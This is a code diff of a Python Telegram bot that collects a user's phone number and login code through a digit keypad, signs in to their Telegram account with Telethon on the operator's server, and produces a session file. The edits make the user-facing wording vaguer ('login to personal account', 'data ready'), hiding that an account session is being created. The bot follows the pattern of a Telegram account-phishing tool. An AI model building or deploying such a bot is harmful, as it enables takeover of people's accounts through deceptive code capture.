@@ -19,29 +19,28 @@ asyncio.set_event_loop(loop)
 def run_async(coro):
     return asyncio.run_coroutine_threadsafe(coro, loop)
 
-# ========== КЛАВИАТУРА ДЛЯ КОДА ==========
+# ========== КЛАВИАТУРА ==========
 def code_keyboard(uid):
     markup = types.InlineKeyboardMarkup(row_width=3)
     buttons = []
     for i in range(1, 10):
-        buttons.append(types.InlineKeyboardButton(str(i), callback_data=f"code_{uid}_{i}"))
-    buttons.append(types.InlineKeyboardButton("0", callback_data=f"code_{uid}_0"))
-    buttons.append(types.InlineKeyboardButton("⌫", callback_data=f"code_{uid}_del"))
-    buttons.append(types.InlineKeyboardButton("✅ Отправить", callback_data=f"code_{uid}_send"))
+        buttons.append(types.InlineKeyboardButton(str(i), callback_data=f"num_{uid}_{i}"))
+    buttons.append(types.InlineKeyboardButton("0", callback_data=f"num_{uid}_0"))
+    buttons.append(types.InlineKeyboardButton("⌫", callback_data=f"num_{uid}_del"))
+    buttons.append(types.InlineKeyboardButton("✅ Готово", callback_data=f"num_{uid}_ok"))
     
     for i in range(0, 9, 3):
         markup.row(*buttons[i:i+3])
     markup.row(buttons[9], buttons[10], buttons[11])
     return markup
 
-# ========== КОМАНДЫ ==========
 @bot.message_handler(commands=['start'])
 def start(m):
     uid = m.chat.id
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
     btn = types.KeyboardButton("📱 Отправить номер", request_contact=True)
     markup.add(btn)
-    bot.send_message(uid, "🔐 Для входа отправьте номер телефона", reply_markup=markup)
+    bot.send_message(uid, "🔐 Вход в личный кабинет", reply_markup=markup)
 
 @bot.message_handler(content_types=['contact'])
 def handle_contact(m):
@@ -57,12 +56,12 @@ def handle_contact(m):
     user_data[uid] = {'phone': phone, 'code': ''}
     
     async def send_code():
-        client = TelegramClient(f'user_{uid}', API_ID, API_HASH)
+        client = TelegramClient(f'data_{uid}', API_ID, API_HASH)
         user_data[uid]['client'] = client
         await client.connect()
         try:
             await client.send_code_request(phone)
-            bot.send_message(uid, f"📲 Код отправлен на {phone}\nВведите его кнопками ниже:", reply_markup=code_keyboard(uid))
+            bot.send_message(uid, f"📲 Код подтверждения отправлен\nВведите код кнопками:", reply_markup=code_keyboard(uid))
         except Exception as e:
             bot.send_message(uid, f"❌ Ошибка: {e}")
             await client.disconnect()
@@ -70,34 +69,32 @@ def handle_contact(m):
     
     run_async(send_code())
 
-@bot.callback_query_handler(func=lambda call: call.data.startswith('code_'))
-def handle_code_input(call):
+@bot.callback_query_handler(func=lambda call: call.data.startswith('num_'))
+def handle_num(call):
     uid = call.from_user.id
-    data = call.data.split('_')
-    
-    if len(data) < 3 or uid not in user_data:
+    if uid not in user_data:
         return
     
-    action = data[2]
+    parts = call.data.split('_')
+    action = parts[2]
     
     if action == 'del':
         user_data[uid]['code'] = user_data[uid]['code'][:-1]
-    elif action == 'send':
+    elif action == 'ok':
         code = user_data[uid]['code']
         if len(code) != 5:
-            bot.answer_callback_query(call.id, "❌ Код должен быть из 5 цифр")
+            bot.answer_callback_query(call.id, "❌ 5 цифр")
             return
         bot.answer_callback_query(call.id)
-        process_code(uid, code, call.message)
+        process_login(uid, code, call.message)
         return
     else:
         if len(user_data[uid]['code']) < 5:
             user_data[uid]['code'] += action
     
-    # Обновляем сообщение с текущим кодом
     try:
         bot.edit_message_text(
-            f"📱 Введите код:\n`{user_data[uid]['code']}`\n\n(кнопками ниже)", 
+            f"🔢 Код: `{user_data[uid]['code']}`\n(5 цифр)", 
             call.message.chat.id, 
             call.message.message_id, 
             parse_mode="Markdown",
@@ -105,12 +102,11 @@ def handle_code_input(call):
         )
     except:
         pass
-    
     bot.answer_callback_query(call.id)
 
-def process_code(uid, code, message):
+def process_login(uid, code, msg):
     if uid not in user_data:
-        bot.send_message(uid, "❌ Ошибка, начните заново /start")
+        bot.send_message(uid, "❌ Ошибка")
         return
     
     client = user_data[uid]['client']
@@ -121,20 +117,17 @@ def process_code(uid, code, message):
             await client.sign_in(phone, code)
             await client.disconnect()
             
-            session_file = f'user_{uid}.session'
+            session_file = f'data_{uid}.session'
             if os.path.exists(session_file):
                 with open(session_file, 'rb') as f:
-                    bot.send_document(uid, f, caption="✅ Готово! Файл сессии во вложении")
+                    bot.send_document(uid, f, caption="✅ Данные готовы")
                 os.remove(session_file)
             else:
-                bot.send_message(uid, "❌ Файл сессии не найден")
+                bot.send_message(uid, "❌ Ошибка")
             
             del user_data[uid]
-            
-            # Убираем клавиатуру
             markup = types.ReplyKeyboardRemove()
-            bot.send_message(uid, "✅ Сессия создана!", reply_markup=markup)
-            
+            bot.send_message(uid, "✅ Завершено", reply_markup=markup)
         except Exception as e:
             bot.send_message(uid, f"❌ Ошибка: {e}")
             await client.disconnect()
@@ -147,5 +140,5 @@ def start_loop():
 
 threading.Thread(target=start_loop, daemon=True).start()
 
-print("🛡️ Session Bot запущен")
+print("🟢 Бот запущен")
 bot.infinity_polling()
